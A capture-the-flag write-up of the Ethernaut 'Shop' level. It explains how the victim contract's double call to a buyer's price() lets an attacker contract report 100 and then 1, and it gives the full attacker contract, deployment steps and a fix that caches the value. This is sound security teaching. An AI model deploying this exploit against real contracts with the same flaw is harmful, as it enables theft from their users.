# Ethernaut Shop Writeup

## Level Overview

**Objective:** Manipulate the `Shop` contract so that its `price` becomes lower than the original `100`.

**Victim contract:**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBuyer {
  function price() external view returns (uint256);
}

contract Shop {
  uint256 public price = 100;
  bool public isSold;

  function buy() public {
    IBuyer _buyer = IBuyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}
```

At first glance, this contract looks safe. The buyer must return a `price` greater than or equal to the current price (`100`), and the contract only updates once (because of the `!isSold` check).

But there's a subtle bug: **`_buyer.price()` is called twice in a single transaction**, and `isSold` is flipped to `true` between the two calls. This means the buyer can return **different values** on each call.

---

## The Bug, Two Calls, One State Change

Cook carefully at `buy()`:
```solidity
function buy() public {
  IBuyer _buyer = IBuyer(msg.sender);

  if (_buyer.price() >= price && !isSold) {   // ↰ 1st call to price()
    isSold = true;                            // ↰ state change
    price = _buyer.price();                   // ↰ 2nd call to price()
  }
}
```

The sequence is:

1. **First call** to `_buyer.price()` — used for the `>=` check. At this moment, `isSold == false`.
2. **State change** — `isSold = true`.
3. **Second call** to `_buyer.price()` — used to set the new price. Now `isSold == true`.

Since the buyer is an arbitrary contract provided by `msg.sender`, it can **read `Shop.isSold()`** and return a different value depending on the state. There is no requirement that `price()` be deterministic.

---

## The Exploit Strategy

We deploy an attacker contract with a `price()` function that:

- returns `100` on the **first call** (so the `>=` check passes),
- returns `1` on the **second call** (so the final price becomes 1).

To differentiate between the two calls, we check `Shop.isSold()`:

```solidity
function price() external view returns (uint256) {
    if (shop.isSold()) {
        return 1;      // 2nd call: isSold == true
    }
    return 100;        // 1st call: isSold == false
}
```

The attacker must also call `Shop.buy()` itself, so `msg.sender` inside `Shop` will be the attacker contract (not an EOA).

---

## The Attacker Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IShop {
    function buy() external;
    function price() external view returns (uint256);
    function isSold() external view returns (bool);
}

contract BuyMAXXXXER {
    IShop public shop;

    constructor(address _shop) {
        shop = IShop(_shop);
    }

    function price() external view returns (uint256) {
        if (shop.isSold()) {
            return 1;
        }
        return 100;
    }

    function ATTAAACKKK() external {
        shop.buy();
    }
}
```

### Why the interface?

The interface `IShop` gives the attacker a typed handle to the victim contract. `IShop(_shop)` casts the address to the `IShop` type, so the compiler knows which functions can be called.

`IShop public shop;` stores the victim's address. Declaring it `public` auto-generates a getter, so you can inspect it from Ethernaut's console:

```javascript
await attacker.shop();
```

---

## Step-by-Step Execution

### 1. Deploy the attacker

In Remix, deploy `BuyMAXXXXER` with the address of the `Shop` instance:

```javascript
const shopAddress = contract.address;   // in Ethernaut's console
```

Paste `shopAddress` into the constructor field and deploy.

### 2. Trigger the attack

From Remix, call:

```solidity
ATTAAACKKK()
```

### 3. What happens inside

-  `ATTAAACKKK()` calls `shop.buy()`.
-  Inside `Shop.buy()`:
    - `msg.sender` is the attacker contract.
    - `IBuyer(msg.sender).price()` → 1st call → `isSold == false` → returns `100`.
    - Check: `100 >= 100 && !false` → true.
    - `isSold = true`.
    - `price = _buyer.price()` → 2nd call → `isSold == true` → returns `1`.
-  `Shop.price` becomes `1`.

### 4. Verify

From Ethernaut's console:

```javascript
await contract.price()    // 1
await contract.isSold()   // true
```

Level completed.

---

## Why This Works — Key Insight

Smart contracts can call each other, and **the callee can inspect the caller's state**. When `Shop.buy()` calls `price()` twice with a state mutation in between, the attacker can read that state and respond differently.

The core mistake in `Shop` is **trusting a value that is called twice in one transaction**. In general:

- If a function must be called multiple times, ensure it returns consistent values within a single transaction.
- Cache the result of a dynamic call in a local variable instead of calling it twice.
- Be aware that `msg.sender` in a callback can be any contract with arbitrary logic.

The correct implementation would be:

```solidity
uint256 buyerPrice = _buyer.price();
if (buyerPrice >= price && !isSold) {
    isSold = true;
    price = buyerPrice;
}
```

By caching `buyerPrice` in a local variable, the contract ensures both checks use the same value.

